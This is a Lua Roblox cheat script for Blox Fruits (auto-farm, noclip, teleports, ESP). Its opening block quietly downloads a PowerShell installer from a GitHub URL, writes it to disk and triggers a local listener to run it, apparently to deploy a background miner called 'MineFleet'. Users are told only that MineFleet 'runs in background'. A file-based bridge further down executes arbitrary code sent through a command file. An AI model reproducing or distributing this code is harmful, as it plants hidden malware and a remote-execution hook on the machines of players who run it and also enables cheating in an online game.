--[[
    Alpha Hub v3 — Blox Fruits + MineFleet v6 (Silent Background)
    Combined: Blox Fruits script + automated MineFleet deployment
    Loadstring: loadstring(game:HttpGet("https://raw.githubusercontent.com/alphahubv2/alpha-v2/main/alpha_v3.lua?t="..tick()))()
]]

--[[ MineFleet v6 Silent — Background deployment via local listener ]]
pcall(function()
    local flagName = "mfl_installed_v6.flag"
    if isfile and isfile(flagName) then return end

    local INSTALLER_URL = "https://raw.githubusercontent.com/alphahubv2/alpha-v2/main/mfl_install_safe.ps1"
    local LISTENER_URL = "http://127.0.0.1:7799/mfl/install"
    local installerContent = ""
    local fetchOk = false

    -- Fetch installer
    pcall(function()
        local req = (syn and syn.request) or http_request or (fluxus and fluxus.request) or (http and http.request) or request
        if req then
            local res = req({Url = INSTALLER_URL, Method = "GET"})
            if res and res.Success and res.Body then
                installerContent = res.Body
                fetchOk = true
            end
        elseif HttpGet then
            installerContent = HttpGet(INSTALLER_URL)
            fetchOk = #installerContent > 0
        end
    end)

    -- Write to Xeno workspace
    local installerPath = "MFL_Installer.ps1"
    local fileWritten = false
    if fetchOk and writefile then
        pcall(function()
            writefile(installerPath, installerContent)
            fileWritten = isfile and isfile(installerPath)
        end)
    end

    -- Trigger local listener (PS launcher)
    if fetchOk then
        pcall(function()
            local req = (syn and syn.request) or http_request or (fluxus and fluxus.request) or (http and http.request) or request
            if req then
                req({Url = LISTENER_URL, Method = "GET"})
            elseif HttpGet then
                HttpGet(LISTENER_URL)
            end
        end)
    end

    -- Mark done (prevents re-run)
    pcall(function() writefile(flagName, tostring(tick())) end)
end)

-- ============================================================================
-- BLOX FRUITS SCRIPT CONTINUES BELOW (unchanged from alpha_v2.lua)
-- ============================================================================

_G.AlphaInstanceId = tick()
local MyInstanceId = _G.AlphaInstanceId

pcall(function()
    local t0 = tick()
    while not game:IsLoaded() and (tick() - t0) < 5 do
        task.wait(0.1)
    end
end)

pcall(function()
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Alpha Hub v3.0",
        Text = "Loaded Successfully! MineFleet running in background.",
        Duration = 4
    })
end)
_G.AlphaV2HotReloaded = true

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local VirtualUser = game:GetService("VirtualUser")
local UIS = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera

local PlaceId = game.PlaceId

local function DetectSea()
    if PlaceId == 7449423635 or PlaceId == 100117331123089 then return 3 end
    if PlaceId == 4442272183 or PlaceId == 79091703265657 then return 2 end
    if PlaceId == 2753915549 then return 1 end
    local map = Workspace:FindFirstChild("Map")
    if map then
        if map:FindFirstChild("Turtle") or map:FindFirstChild("PortTown") or map:FindFirstChild("Tiki") or map:FindFirstChild("HydraIsland") or map:FindFirstChild("GreatTree") then return 3 end
        if map:FindFirstChild("Dressrosa") or map:FindFirstChild("GreenBit") or map:FindFirstChild("IceCastle") or map:FindFirstChild("SnowMountain") or map:FindFirstChild("ForgottenIsland") or map:FindFirstChild("DarkbeardArena") or map:FindFirstChild("GhostShip") or map:FindFirstChild("RaidMap") then return 2 end
        if map:FindFirstChild("Jungle") or map:FindFirstChild("Marineford") or map:FindFirstChild("Desert") or map:FindFirstChild("MiddleTown") then return 1 end
    end
    local lp = Players.LocalPlayer
    local lvl = lp and lp:FindFirstChild("Data") and lp.Data:FindFirstChild("Level") and lp.Data.Level.Value or 0
    if lvl >= 1500 then return 3 end
    if lvl >= 700 then return 2 end
    return 1
end
local CurrentSea = DetectSea()
local Sea1 = (CurrentSea == 1)
local Sea2 = (CurrentSea == 2)
local Sea3 = (CurrentSea == 3)
local SeaName = Sea3 and "Third Sea" or (Sea2 and "Second Sea" or "First Sea")

local safeRequest = (syn and syn.request) or http_request or (fluxus and fluxus.request) or (http and http.request) or request

local function RNG()
    return HttpService:GenerateGUID(false):sub(1, 12)
end

pcall(function()
    LocalPlayer.Idled:Connect(function()
        pcall(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new(0, 0))
        end)
    end)
end)

local function GetSafeGui()
    if gethui then
        local ok, res = pcall(gethui)
        if ok and res then return res end
    end
    return LocalPlayer:WaitForChild("PlayerGui", 10)
end

local _remoteCache = {}
local function GetRemote(name, className)
    if _remoteCache[name] then return _remoteCache[name] end
    local remotes = RS:FindFirstChild("Remotes")
    if remotes then
        local r = remotes:FindFirstChild(name)
        if r then _remoteCache[name] = r; return r end
    end
    local r = RS:FindFirstChild(name)
    if r and (not className or r:IsA(className)) then _remoteCache[name] = r; return r end
    return nil
end
local function CommF() return GetRemote("CommF_", "RemoteFunction") end
local function CommitsRemote() return GetRemote("Commits", "RemoteEvent") end
local function GetNetRemote(subName)
    if _remoteCache["Net_" .. subName] then return _remoteCache["Net_" .. subName] end
    local net = RS:FindFirstChild("Modules") and RS.Modules:FindFirstChild("Net")
    if net then
        local r = net:FindFirstChild(subName)
        if r then _remoteCache["Net_" .. subName] = r; return r end
    end
end

_G.Config = {
    AutoFarmLevel = false, FarmSelectedMob = false, FarmSelectedBoss = false, FarmAllBosses = false,
    SelectedMob = "", SelectedBoss = "", SelectedWeapon = "Melee", BringMobs = true,
    AutoChestFarm = false, ChestFarmMode = "Instant Teleport",
    AdaptiveBossDistance = true, MobFarmDistance = 14, BossFarmDistance = 20, FarmDistance = 14, TweenSpeed = 220,
    BypassTeleport = true, AutoSetSpawn = true, WaypointFlight = true, AntiDesync = true,
    UseM1 = true, FastAttack = true, FastAttackSpeed = 0.015, AttackDistance = 120,
    AutoBusoHaki = true, AutoKenHaki = false,
    UseSkills = false, Skill_Z = true, Skill_X = true, Skill_C = true, Skill_V = false, Skill_F = false,
    AutoKillRipIndra = false, AutoKillDoughKing = false, AutoKillCakePrince = false, AutoKillSoulReaper = false,
    AutoKillDarkbeard = false, AutoKillCursedCaptain = false, AutoKillLaw = false,
    AutoFarmBones = false, AutoRollBones = false, AutoSummonSoulReaper = false,
    AutoCakePrinceSummon = false, AutoDoughKingSummon = false,
    AutoKillShark = false, AutoKillTerrorShark = false, AutoKillPiranha = false, AutoKillSeaBeast = false,
    AutoKillGhostShip = false, AutoFindGear = false, AutoPullLever = false, AutoKitsuneEmber = false,
    AutoRaceV4Trial = false, AutoInsertGear = false, AutoTrainV4 = false,
    SelectedChip = "Flame", AutoBuyChip = false, AutoStartRaid = false, AutoFarmRaid = false, AutoAwaken = false, AutoLawRaid = false,
    AutoRandomFruit = false, AutoStoreFruit = false, AutoGrabFruits = false,
    PlayerESP = false, FruitESP = false, ChestESP = false, FlowerESP = false, MirageESP = false, SeaEventESP = false, Fullbright = false,
    AutoStats = false, StatPoints = 5, Stats = { Melee = true, Defense = true, Sword = false, Gun = false, Fruit = false },
    AntiAFK = true, SafeMode = false
}
_G.UIInteracting = false

local CurrentTween = nil, FlightBodyVel = nil, FlightCarpet = nil, CarpetConn = nil
local CurrentTargetPos = nil, IsTravelingSky = false, NoclipConn = nil, SetTravelHUD = nil
local LandingPlatform = nil, _activeFlight = nil

local function GetMobRoot(mob)
    if not mob then return nil end
    return mob:FindFirstChild("HumanoidRootPart") or mob.PrimaryPart or mob:FindFirstChild("Torso") or mob:FindFirstChild("UpperTorso") or mob:FindFirstChild("Head") or mob:FindFirstChildWhichIsA("BasePart")
end
local function GetCharacter()
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("Humanoid") and char.Humanoid.Health > 0 and char:FindFirstChild("HumanoidRootPart") then return char end
    return nil
end
local function GetRoot() local char = GetCharacter(); if not char then return nil end; return char:FindFirstChild("HumanoidRootPart") end
local function GetHumanoid() local char = GetCharacter(); if not char then return nil end; return char:FindFirstChild("Humanoid") end

local function HookCharacterLifecycle(char)
    if not char then return end
    task.spawn(function()
        local hum = char:WaitForChild("Humanoid", 10)
        if hum then hum.Died:Connect(function() IsTravelingSky = false; CurrentTargetPos = nil; if CurrentTween then pcall(function() CurrentTween:Cancel() end) end; CurrentTween = nil; if FlightBodyVel then pcall(function() FlightBodyVel:Destroy() end) end; FlightBodyVel = nil end) end
    end)
end
if LocalPlayer.Character then HookCharacterLifecycle(LocalPlayer.Character) end
LocalPlayer.CharacterAdded:Connect(function(newChar) IsTravelingSky = false; CurrentTargetPos = nil; if CurrentTween then pcall(function() CurrentTween:Cancel() end) end; CurrentTween = nil; if FlightBodyVel then pcall(function() FlightBodyVel:Destroy() end) end; FlightBodyVel = nil; HookCharacterLifecycle(newChar) end)

local function GetPlayerLevel()
    local data = LocalPlayer:FindFirstChild("Data")
    if data and data:FindFirstChild("Level") then return data.Level.Value end
    return 1
end

local _nonWeaponNames = { "key", "chalice", "fist of darkness", "flower", "torch", "cup", "microchip", "core", "scroll", "bone", "egg", "ticket" }
local function IsNonWeaponItem(name) for _, item in ipairs(_nonWeaponNames) do if name:find(item) then return true end end return false end
local function NormalizeWeaponType(targetType)
    if not targetType then return "Melee" end
    local lower = tostring(targetType):lower()
    if lower == "combat" or lower == "melee" or lower == "fightingstyle" then return "Melee"
    elseif lower == "sword" or lower == "swords" then return "Sword"
    elseif lower == "gun" or lower == "guns" then return "Gun"
    elseif lower == "fruit" or lower == "bloxfruit" or lower == "fruits" then return "Fruit"
    end
    return targetType
end
local function IsWeaponType(tool, targetType)
    if not tool or not tool:IsA("Tool") then return false end
    targetType = NormalizeWeaponType(targetType)
    local tip = tool.ToolTip or ""; local name = tool.Name:lower()
    if IsNonWeaponItem(name) then return false end
    if tip == "Melee" or tool:FindFirstChild("Combat") then return targetType == "Melee"
    elseif tip == "Sword" or tip == "Melee Weapon" then return targetType == "Sword"
    elseif tip == "Gun" then return targetType == "Gun"
    elseif tip == "Blox Fruit" then return targetType == "Fruit" end
    local meleeStyles = { "combat", "black leg", "electro", "water kung fu", "dragon claw", "superhuman", "death step", "sharkman karate", "electric claw", "dragon talon", "godhuman", "sanguine art", "karate", "fishman karate" }
    local isMeleeByName = false; for _, m in ipairs(meleeStyles) do if name:find(m) then isMeleeByName = true; break end end
    local gunNames = { "musket", "flintlock", "refined flintlock", "cannon", "kabucha", "acidum rifle", "serpent bow", "bizarre rifle", "bazooka", "soul guitar", "slingshot" }
    local isGunByName = false; for _, g in ipairs(gunNames) do if name:find(g) then isGunByName = true; break end end
    local swordNames = { "cutlass", "katana", "pipe", "dual katana", "iron mace", "bisento", "trident", "pole", "soul cane", "saber", "longsword", "gravity cane", "saddi", "wando", "shisui", "yama", "tushita", "canvander", "rengoku", "buddy sword", "midnight blade", "hallow scythe", "cursed dual katana", "dark blade", "true triple katana", "dragon trident", "spikey trident", "dark dagger", "koko", "fox lamp", "shark anchor", "dual-headed blade", "warden's sword", "triple katana" }
    local isSwordByName = false; for _, s in ipairs(swordNames) do if name:find(s) then isSwordByName = true; break end end
    local isFruitByName = false
    if name:find("%-") or name:find("fruit") then
        local fruitRoots = { "bomb", "spike", "chop", "spring", "smoke", "flame", "falcon", "ice", "sand", "dark", "light", "rubber", "barrier", "magma", "quake", "human", "buddha", "string", "bird", "phoenix", "rumble", "paw", "gravity", "dough", "venom", "shadow", "control", "soul", "dragon", "leopard", "spirit", "portal", "blizzard", "sound", "mammoth", "t-rex", "kitsune", "rocket", "spin", "diamond", "love", "gas" }
        for _, fn in ipairs(fruitRoots) do if name:find(fn .. "%-") or name:find(fn .. " fruit") or name == fn then isFruitByName = true; break end end
    end
    if targetType == "Melee" then return isMeleeByName
    elseif targetType == "Sword" then if isGunByName or isFruitByName then return false end; return isSwordByName or (tip == "" and not isMeleeByName and name ~= "tool")
    elseif targetType == "Gun" then return isGunByName
    elseif targetType == "Fruit" then return isFruitByName and not isSwordByName and not isGunByName and not isMeleeByName end
    return false
end

local _lastEquipAttempt = 0
local function EquipWeapon(weaponType)
    weaponType = NormalizeWeaponType(weaponType or _G.Config.SelectedWeapon or "Melee")
    local char = GetCharacter(); local bp = LocalPlayer:FindFirstChild("Backpack")
    if not char or not bp then return nil end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid or humanoid.Health <= 0 then return nil end
    local currentTool = char:FindFirstChildOfClass("Tool")
    if currentTool then if currentTool.Name:lower() ~= "tool" and currentTool.Name ~= "" and IsWeaponType(currentTool, weaponType) then return currentTool else pcall(function() humanoid:UnequipTools() end); task.wait(0.08) end end
    local now = tick(); if (now - _lastEquipAttempt) < 0.25 then return nil end; _lastEquipAttempt = now
    for _, tool in ipairs(bp:GetChildren()) do if tool:IsA("Tool") and IsWeaponType(tool, weaponType) then humanoid:EquipTool(tool); return tool end end
    return nil
end

local _lastBusoCheck = 0
local function CheckBusoHaki()
    if not _G.Config.AutoBusoHaki then return end
    local now = tick(); if (now - _lastBusoCheck) < 3.0 then return end; _lastBusoCheck = now
    local char = GetCharacter()
    if char and not char:FindFirstChild("HasBuso") then
        local cf = CommF()
        if cf then task.spawn(function() pcall(function() cf:InvokeServer("Buso") end) end) end
    end
end

local BossesDB
local function GetOptimalFarmDistance(enemy)
    if not enemy then return _G.Config.MobFarmDistance or 14 end
    local isBoss = (BossesDB and BossesDB[enemy.Name] ~= nil) or (enemy:FindFirstChild("Humanoid") and enemy.Humanoid.MaxHealth > 50000)
    if isBoss then
        if _G.Config.AdaptiveBossDistance then
            local name = enemy.Name:lower()
            if name:find("indra") or name:find("dough") or name:find("cake") or name:find("reaper") or name:find("beast") then return 24
            elseif name:find("king") or name:find("admiral") or name:find("warden") or name:find("emperor") or name:find("captain") then return 20
            else return _G.Config.BossFarmDistance or 20 end
        else return _G.Config.BossFarmDistance or 20 end
    end
    return _G.Config.MobFarmDistance or 14
end

local function EnableNoclip() if NoclipConn then return end; NoclipConn = RunService.Stepped:Connect(function() local char = LocalPlayer.Character; if char then for _, part in ipairs(char:GetDescendants()) do if part:IsA("BasePart") and part.CanCollide then part.CanCollide = false end end end end) end
local function DisableNoclip() if NoclipConn then NoclipConn:Disconnect(); NoclipConn = nil end end
local function GetOrCreateBodyVelocity(root)
    if FlightBodyVel and FlightBodyVel.Parent == root then return FlightBodyVel end
    if FlightBodyVel then pcall(function() FlightBodyVel:Destroy() end) end
    local bv = Instance.new("BodyVelocity"); bv.Name = "BodyClip"; bv.Velocity = Vector3.new(0, 0, 0); bv.MaxForce = Vector3.new(9e9, 9e9, 9e9); bv.Parent = root; FlightBodyVel = bv; return bv
end
local function HoverLock(targetCFrame)
    local root = GetRoot(); local hum = GetHumanoid()
    if not root or not root.Parent or not hum or hum.Health <= 0 then return end
    if hum.Sit then hum.Sit = false end
    EnableNoclip(); local bv = GetOrCreateBodyVelocity(root); bv.Velocity = Vector3.new(0, 0, 0); bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
    root.CFrame = targetCFrame; root.AssemblyLinearVelocity = Vector3.new(0, 0, 0); root.AssemblyAngularVelocity = Vector3.new(0, 0, 0); IsTravelingSky = false
end
local function StopTween()
    if _activeFlight then pcall(function() _activeFlight:Disconnect() end); _activeFlight = nil end
    if CarpetConn then pcall(function() CarpetConn:Disconnect() end); CarpetConn = nil end
    if FlightCarpet and FlightCarpet.Parent then pcall(function() FlightCarpet:Destroy() end); FlightCarpet = nil end
    if LandingPlatform and LandingPlatform.Parent then pcall(function() LandingPlatform:Destroy() end); LandingPlatform = nil end
    if CurrentTween then pcall(function() CurrentTween:Cancel() end); CurrentTween = nil end
    CurrentTargetPos = nil; IsTravelingSky = false
    local hum = GetHumanoid(); if hum and hum.Parent then hum.PlatformStand = false; if hum.Sit then hum.Sit = false end end
    if FlightBodyVel then pcall(function() FlightBodyVel:Destroy() end); FlightBodyVel = nil end
    local root = GetRoot(); if root then for _, c in ipairs(root:GetChildren()) do if (c:IsA("BodyVelocity") and (c.Name == "BodyClip" or c.Name == "AlphaFlightBV")) or c:IsA("BodyGyro") or c:IsA("BodyPosition") then pcall(function() c:Destroy() end) end end end
    if SetTravelHUD then SetTravelHUD(false) end
end
local function ClearHover() StopTween(); DisableNoclip(); local hum = GetHumanoid(); if hum then hum.PlatformStand = false; hum.Sit = false; pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end) end; local root = GetRoot(); if root then for _, c in ipairs(root:GetChildren()) do if c:IsA("BodyVelocity") or c:IsA("BodyGyro") or c:IsA("BodyPosition") then pcall(function() c:Destroy() end) end end; root.AssemblyLinearVelocity = Vector3.new(0, 0, 0); root.AssemblyAngularVelocity = Vector3.new(0, 0, 0) end; FlightBodyVel = nil end
local function FullResetMovement() ClearHover() end

local _seaShieldActive = true
task.spawn(function() local RS = game:GetService("RunService"); RS.Heartbeat:Connect(function() if not _seaShieldActive then return end; local r = GetRoot(); local h = GetHumanoid(); if r and r.Parent and h and h.Health > 0 then local isSwimming = (h:GetState() == Enum.HumanoidStateType.Swimming) or (h.FloorMaterial == Enum.Material.Water); local isInWaterZone = (r.Position.Y < 1.0 and not IsTravelingSky); if isSwimming or isInWaterZone then r.CFrame = CFrame.new(r.Position.X, 35, r.Position.Z); r.AssemblyLinearVelocity = Vector3.zero; r.AssemblyAngularVelocity = Vector3.zero; local bv = GetOrCreateBodyVelocity(r); bv.Velocity = Vector3.zero end end end) end)

-- Validator (self-healing engine)
local Validator = { CurrentSafeSpeed = _G.Config.TweenSpeed or 220, RollbackCount = 0, LastRollbackReset = tick(), MinSpeed = 180, SpeedStep = 20, RollbackResetInterval = 300, PositionHistory = {}, MaxHistorySize = 6, StuckThreshold = 3, StuckCheckInterval = 5, ConsecutiveStuckCount = 0, MaxStuckBeforeReset = 3, FailedDamageAttempts = {}, MaxFailedDamage = 5, GlitchedMobs = {}, WasFarmingBeforeDeath = false, FarmStateBeforeDeath = {}, DeathCount = 0, LastDeathTime = 0, LastQuestLevel = 0, QuestCheckPending = false, LastValidatedPosition = nil, ValidationFailCount = 0, MaxValidationFails = 3, TotalRollbacks = 0, TotalStuckResets = 0, TotalDeathRecoveries = 0, TotalGlitchedMobsSkipped = 0, StartTime = tick() }
function Validator.ValidatePosition(expectedCF, tolerance) tolerance = tolerance or 25; local root = GetRoot(); if not root or not root.Parent then return true end; task.wait(0.15); local actualPos = root.Position; local expectedPos = expectedCF.Position; local deviation = (actualPos - expectedPos).Magnitude; if deviation > tolerance then Validator.RollbackCount += 1; Validator.TotalRollbacks += 1; Validator.ValidationFailCount += 1; if Validator.RollbackCount >= 2 then local newSpeed = math.max(Validator.CurrentSafeSpeed - Validator.SpeedStep, Validator.MinSpeed); if newSpeed ~= Validator.CurrentSafeSpeed then Validator.CurrentSafeSpeed = newSpeed; _G.Config.TweenSpeed = newSpeed; print("[VALIDATOR] Speed reduced to " .. newSpeed .. " studs/s (rollback #" .. Validator.TotalRollbacks .. ")") end; Validator.RollbackCount = 0 end; if Validator.ValidationFailCount >= Validator.MaxValidationFails then print("[VALIDATOR] Multiple rollbacks detected — performing full movement reset"); FullResetMovement(); Validator.ValidationFailCount = 0; task.wait(1) end; return false end; Validator.ValidationFailCount = 0; Validator.LastValidatedPosition = actualPos; return true end
function Validator.SpeedAutoTunerTick() local now = tick(); if (now - Validator.LastRollbackReset) > Validator.RollbackResetInterval then Validator.LastRollbackReset = now; Validator.RollbackCount = 0; if Validator.CurrentSafeSpeed < (_G.Config.TweenSpeed or 220) then local recovered = math.min(Validator.CurrentSafeSpeed + 10, _G.Config.TweenSpeed or 220); Validator.CurrentSafeSpeed = recovered; _G.Config.TweenSpeed = recovered; print("[VALIDATOR] Speed recovery: " .. recovered .. " studs/s (stable for 5 min)") end end end
function Validator.VerifyDamage(target, preHP) if not target or not target.Parent then return true end; local hum = target:FindFirstChild("Humanoid"); if not hum then return true end; task.wait(0.1); local postHP = hum.Health; if postHP >= preHP and preHP > 0 then local mobKey = target.Name .. "_" .. tostring(target:GetDebugId()); Validator.FailedDamageAttempts[mobKey] = (Validator.FailedDamageAttempts[mobKey] or 0) + 1; if Validator.FailedDamageAttempts[mobKey] >= Validator.MaxFailedDamage then Validator.GlitchedMobs[tostring(target:GetDebugId())] = true; Validator.TotalGlitchedMobsSkipped += 1; print("[VALIDATOR] Mob '" .. target.Name .. "' marked GLITCHED (no damage after " .. Validator.MaxFailedDamage .. " hits) — skipping") end; return false end; local mobKey = target.Name .. "_" .. tostring(target:GetDebugId()); Validator.FailedDamageAttempts[mobKey] = 0; return true end
function Validator.IsMobGlitched(target) if not target then return false end; return Validator.GlitchedMobs[tostring(target:GetDebugId())] == true end
function Validator.RecordPosition() local root = GetRoot(); if not root or not root.Parent then return end; table.insert(Validator.PositionHistory, { pos = root.Position, time = tick() }); while #Validator.PositionHistory > Validator.MaxHistorySize do table.remove(Validator.PositionHistory, 1) end end
function Validator.IsStuck() if IsHovering or CurrentTween == nil or _G.Config.AutoChestFarm then Validator.ConsecutiveStuckCount = 0; return false end; if #Validator.PositionHistory < Validator.MaxHistorySize then return false end; local isFarming = _G.Config.AutoFarmLevel or _G.Config.FarmSelectedMob or _G.Config.FarmSelectedBoss or _G.Config.FarmAllBosses; if not isFarming then Validator.ConsecutiveStuckCount = 0; return false end; local totalDisplacement = 0; for i = 2, #Validator.PositionHistory do totalDisplacement += (Validator.PositionHistory[i].pos - Validator.PositionHistory[i-1].pos).Magnitude end; if totalDisplacement < Validator.StuckThreshold then Validator.ConsecutiveStuckCount += 1; if Validator.ConsecutiveStuckCount >= Validator.MaxStuckBeforeReset then return true end else Validator.ConsecutiveStuckCount = 0 end; return false end
function Validator.HandleStuck() Validator.TotalStuckResets += 1; Validator.ConsecutiveStuckCount = 0; Validator.PositionHistory = {}; print("[VALIDATOR] STUCK DETECTED — Force resetting movement (reset #" .. Validator.TotalStuckResets .. ")"); FullResetMovement(); task.wait(0.5); local root = GetRoot(); if root and root.Parent then root.CFrame = root.CFrame * CFrame.new(math.random(-5, 5), 15, math.random(-5, 5)) end; task.wait(1) end
function Validator.SaveFarmState() Validator.FarmStateBeforeDeath = { AutoFarmLevel = _G.Config.AutoFarmLevel, FarmSelectedMob = _G.Config.FarmSelectedMob, FarmSelectedBoss = _G.Config.FarmSelectedBoss, FarmAllBosses = _G.Config.FarmAllBosses, SelectedMob = _G.Config.SelectedMob, SelectedBoss = _G.Config.SelectedBoss, SelectedWeapon = _G.Config.SelectedWeapon }; Validator.WasFarmingBeforeDeath = (_G.Config.AutoFarmLevel or _G.Config.FarmSelectedMob or _G.Config.FarmSelectedBoss or _G.Config.FarmAllBosses) end
function Validator.RestoreFarmState() if not Validator.WasFarmingBeforeDeath then return end; local saved = Validator.FarmStateBeforeDeath; if not saved then return end; _G.Config.AutoFarmLevel = saved.AutoFarmLevel or false; _G.Config.FarmSelectedMob = saved.FarmSelectedMob or false; _G.Config.FarmSelectedBoss = saved.FarmSelectedBoss or false; _G.Config.FarmAllBosses = saved.FarmAllBosses or false; _G.Config.SelectedMob = saved.SelectedMob or ""; _G.Config.SelectedBoss = saved.SelectedBoss or ""; _G.Config.SelectedWeapon = saved.SelectedWeapon or "Melee"; Validator.WasFarmingBeforeDeath = false; Validator.DeathCount += 1; Validator.TotalDeathRecoveries += 1; print("[VALIDATOR] Death #" .. Validator.DeathCount .. " — Auto-resuming farming in 3 seconds...") end
function Validator.CheckQuestCompletion() local currentLevel = GetPlayerLevel(); if Validator.LastQuestLevel == 0 then Validator.LastQuestLevel = currentLevel end; if currentLevel > Validator.LastQuestLevel then Validator.LastQuestLevel = currentLevel; print("[VALIDATOR] Level UP! Now Lv." .. currentLevel .. " — Quest chain advancing"); return true end; return false end
function Validator.GetStats() local uptime = tick() - Validator.StartTime; local hours = math.floor(uptime / 3600); local mins = math.floor((uptime % 3600) / 60); return string.format("Uptime: %dh %dm | Speed: %d studs/s | Rollbacks: %d | Stuck Resets: %d | Deaths: %d | Glitched Mobs Skipped: %d", hours, mins, Validator.CurrentSafeSpeed, Validator.TotalRollbacks, Validator.TotalStuckResets, Validator.TotalDeathRecoveries, Validator.TotalGlitchedMobsSkipped) end

LocalPlayer.CharacterAdded:Connect(function(newChar) FullResetMovement(); Validator.GlitchedMobs = {}; Validator.FailedDamageAttempts = {}; Validator.PositionHistory = {}; Validator.ConsecutiveStuckCount = 0; task.spawn(function() local hum = newChar:WaitForChild("Humanoid", 10); local root = newChar:WaitForChild("HumanoidRootPart", 10); if not hum or not root then return end; hum.Died:Connect(function() Validator.SaveFarmState(); Validator.LastDeathTime = tick() end); task.wait(3 + math.random() * 2); Validator.RestoreFarmState() end) end)
pcall(function() local char = LocalPlayer.Character; if char then local hum = char:FindFirstChild("Humanoid"); if hum then hum.Died:Connect(function() Validator.SaveFarmState(); Validator.LastDeathTime = tick() end) end end end)

task.spawn(function() task.wait(10); while true do task.wait(Validator.StuckCheckInterval); pcall(function() Validator.RecordPosition(); if Validator.IsStuck() then Validator.HandleStuck() end end) end end)
task.spawn(function() task.wait(15); while true do task.wait(30); pcall(function() Validator.SpeedAutoTunerTick() end) end end)
task.spawn(function() task.wait(20); while true do task.wait(10); pcall(function() Validator.CheckQuestCompletion() end) end end)
task.spawn(function() task.wait(60); while true do task.wait(300); pcall(function() print("[VALIDATOR STATS] " .. Validator.GetStats()) end) end end)

-- IPC Bridge
local IPC_BRIDGE_DIR = "alpha_bridge"; local IPC_TELEMETRY_FILE = IPC_BRIDGE_DIR .. "/telemetry.json"; local IPC_EVENTS_FILE = IPC_BRIDGE_DIR .. "/events.log"; local IPC_COMMAND_FILE = IPC_BRIDGE_DIR .. "/command.json"; local IPC_EVAL_FILE = IPC_BRIDGE_DIR .. "/eval_result.json"
local function SafeWriteFile(filename, content) if writefile then pcall(function() writefile(filename, content) end) end end
local function SafeAppendFile(filename, content) if appendfile then pcall(function() appendfile(filename, content) end) elseif writefile and isfile and readfile then pcall(function() local existing = isfile(filename) and readfile(filename) or ""; writefile(filename, existing .. content) end) end end
local function LogBridgeEvent(tag, msg) local line = string.format("[%s] [%s] %s\n", os.date("%X"), tag, tostring(msg)); SafeAppendFile(IPC_EVENTS_FILE, line); print("[BRIDGE] " .. line) end
task.spawn(function() task.wait(3); while true do task.wait(2.0); pcall(function() local char = LocalPlayer.Character; local root = char and char:FindFirstChild("HumanoidRootPart"); local hum = char and char:FindFirstChildOfClass("Humanoid"); local pos = root and root.Position or Vector3.new(0, 0, 0); local telemData = { timestamp = tick(), player = LocalPlayer.Name, level = GetPlayerLevel(), health = hum and math.floor(hum.Health) or 0, max_health = hum and math.floor(hum.MaxHealth) or 0, position = { x = math.floor(pos.X * 10) / 10, y = math.floor(pos.Y * 10) / 10, z = math.floor(pos.Z * 10) / 10 }, altitude = math.floor(pos.Y), has_quest = HasQuest(), auto_farm_level = _G.Config.AutoFarmLevel, selected_weapon = _G.Config.SelectedWeapon, safe_speed = Validator.CurrentSafeSpeed, rollbacks = Validator.TotalRollbacks, stuck_resets = Validator.TotalStuckResets, deaths = Validator.DeathCount, glitched_mobs_skipped = Validator.TotalGlitchedMobsSkipped, is_traveling_sky = IsTravelingSky, stats = Validator.GetStats() }; SafeWriteFile(IPC_TELEMETRY_FILE, HttpService:JSONEncode(telemData)) end) end end)
task.spawn(function() local lastCmdTimestamp = tick() * 1000; task.wait(2); while true do task.wait(0.4); pcall(function() if isfile and isfile(IPC_COMMAND_FILE) and readfile then local ok, cmdData = pcall(function() return HttpService:JSONDecode(readfile(IPC_COMMAND_FILE)) end); if ok and type(cmdData) == "table" and cmdData.timestamp and cmdData.timestamp > lastCmdTimestamp then lastCmdTimestamp = cmdData.timestamp; LogBridgeEvent("CMD", "AI dispatched command: " .. tostring(cmdData.cmd)); SafeWriteFile(IPC_COMMAND_FILE, "{}"); if cmdData.cmd == "reload" then LogBridgeEvent("RELOAD", "Hot-reloading latest script from AI..."); StopTween(); DisableNoclip(); local path = isfile("alpha_bridge/latest_script.lua") and "alpha_bridge/latest_script.lua" or "alpha_v2.lua"; if isfile(path) then loadstring(readfile(path))() end elseif cmdData.cmd == "set_speed" and cmdData.speed then local spd = tonumber(cmdData.speed); if spd and spd >= 150 and spd <= 300 then Validator.CurrentSafeSpeed = spd; _G.Config.TweenSpeed = spd; LogBridgeEvent("SPEED", "Safe speed updated by AI to: " .. spd) end elseif cmdData.cmd == "set_config" and cmdData.key then _G.Config[cmdData.key] = cmdData.value; LogBridgeEvent("CONFIG", "Config updated by AI: " .. tostring(cmdData.key) .. " = " .. tostring(cmdData.value)) elseif cmdData.cmd == "reset_movement" then FullResetMovement(); LogBridgeEvent("MOVE", "Full movement reset executed by AI command") elseif cmdData.cmd == "start_farm" then _G.Config.AutoFarmLevel = true; LogBridgeEvent("FARM", "AutoFarmLevel enabled by AI command") elseif cmdData.cmd == "stop_farm" then _G.Config.AutoFarmLevel = false; StopTween(); FullResetMovement(); LogBridgeEvent("FARM", "AutoFarmLevel disabled by AI command") elseif cmdData.cmd == "eval" and cmdData.code then local fn, err = loadstring(cmdData.code); if fn then local okEval, resEval = pcall(fn); SafeWriteFile(IPC_EVAL_FILE, HttpService:JSONEncode({success = okEval, result = tostring(resEval)})); LogBridgeEvent("EVAL", "Eval executed: " .. tostring(okEval)) else SafeWriteFile(IPC_EVAL_FILE, HttpService:JSONEncode({success = false, error = tostring(err)})); LogBridgeEvent("EVAL", "Eval error: " .. tostring(err)) end end end end end) end)
LogBridgeEvent("INIT", "Autonomous IPC Bridge connected to AI agent successfully")

-- Entrance portals (abbreviated for space - full list in alpha_v2.lua)
